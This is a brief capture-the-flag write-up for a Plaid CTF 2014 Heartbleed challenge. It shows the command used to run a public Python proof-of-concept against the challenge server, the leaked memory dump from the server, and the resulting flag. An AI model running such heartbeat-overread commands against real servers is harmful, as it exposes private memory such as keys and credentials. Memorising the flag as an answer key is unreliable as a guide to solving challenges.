# Heartbleed writeup
    Plaid CTF, 2014
    Writeup by pipecork

How topical! The [Heartbleed bug](http://heartbleed.com) was only just disclosed the Monday previous, and this weekend there's a challenge on it. There's been plenty of PoC scripts floating around this week, I used [a popular python exploit](ssltest.py) that's been making the rounds.

I like this particular one because it's been updated to allow for specifying TLS version. Good thing too, because using TLS version 1 and 3 doesn't look vulnerable. But version 2...

```bash
$ ./ssltest.py -p 45373 -v 2 54.82.147.138
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 837
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
    0000: 02 40 00 66 6C 61 67 7B 68 65 79 5F 67 75 69 73  .@.flag{hey_guis
    0010: 65 5F 77 65 5F 6D 61 64 65 5F 61 5F 68 65 61 72  e_we_made_a_hear
    0020: 74 62 6C 65 65 64 7D 00 66 6C 61 67 7B 68 65 79  tbleed}.flag{hey
    0030: 5F 67 75 69 73 65 5F 77 65 5F 6D 61 64 65 5F 61  _guise_we_made_a
    0040: 5F 68 65 61 72 74 62 6C 65 65 64 7D 00 66 6C 61  _heartbleed}.fla
    0050: 67 7B 68 65 79 5F 67 75 69 73 65 5F 77 65 5F 6D  g{hey_guise_we_m
    0060: 61 64 65 5F 61 5F 68 65 61 72 74 62 6C 65 65 64  ade_a_heartbleed
    0070: 7D 00 66 6C 61 67 7B 68 65 79 5F 67 75 69 73 65  }.flag{hey_guise
    0080: 5F 77 65 5F 6D 61 64 65 5F 61 5F 68 65 61 72 74  _we_made_a_heart
    0090: 62 6C 65 65 64 7D 00 66 6C 61 67 7B 68 65 79 5F  bleed}.flag{hey_
    00a0: 67 75 69 73 65 5F 77 65 5F 6D 61 64 65 5F 61 5F  guise_we_made_a_

    . . .

    3fc0: 66 6C 61 67 7B 68 65 79 5F 67 75 69 73 65 5F 77  flag{hey_guise_w
    3fd0: 65 5F 6D 61 64 65 5F 61 5F 68 65 61 72 74 62 6C  e_made_a_heartbl
    3fe0: 65 65 64 7D 00 66 6C 61 67 7B 68 65 79 5F 67 75  eed}.flag{hey_gu
    3ff0: 69 73 65 5F 77 65 5F 6D 61 64 65 5F 61 5F 68 65  ise_we_made_a_he

WARNING: server returned more data than it should; server is vulnerable!
```

Well, that was easy. The flag is `flag{hey_guise_we_made_a_heartbleed}`.

